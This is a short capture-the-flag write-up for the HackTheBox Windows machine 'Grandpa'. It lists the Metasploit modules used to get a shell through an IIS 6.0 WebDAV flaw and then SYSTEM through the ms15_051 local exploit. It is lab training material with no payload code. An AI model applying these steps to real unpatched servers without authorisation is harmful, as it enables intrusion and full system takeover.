# Grandpa


| Key | Value |
|-----|-------|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Easy |

10.10.10.14

## Recon
80/tcp open  http    Microsoft IIS httpd 6.0

## Exploitation
msf6 > search IIS 6.0
use windows/iis/iis_webdav_scstoragepathfromurl
set options
you got shell

migrate with other ps like davcdata.exe

## Privilege Escalation
use multi/recon/local_exploit_suggester
set options run


use exploit/windows/local/ms15_051_client_copy_image
set options run

you got system
